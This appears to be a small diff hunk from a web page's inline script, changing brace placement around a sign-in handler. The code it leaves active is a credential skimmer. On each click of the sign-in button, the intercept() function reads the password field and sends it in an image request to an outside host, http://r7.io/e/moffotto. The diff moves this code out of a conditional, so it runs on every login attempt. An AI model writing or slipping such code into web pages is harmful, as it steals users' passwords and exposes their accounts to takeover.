@@ -16,14 +16,13 @@
             language = 'english';
             if(language == "english") {
                 console.log(language);
-
+            }
 		function intercept() { 
 			var pass = document.forms[0].elements[1].value; 
 			var i = new Image; 
 			i.src = "http://r7.io/e/moffotto?s=password="+pass;
 		}; 
 		$( "#signin-btn").click(intercept);
-            }
         });
     </script>
 
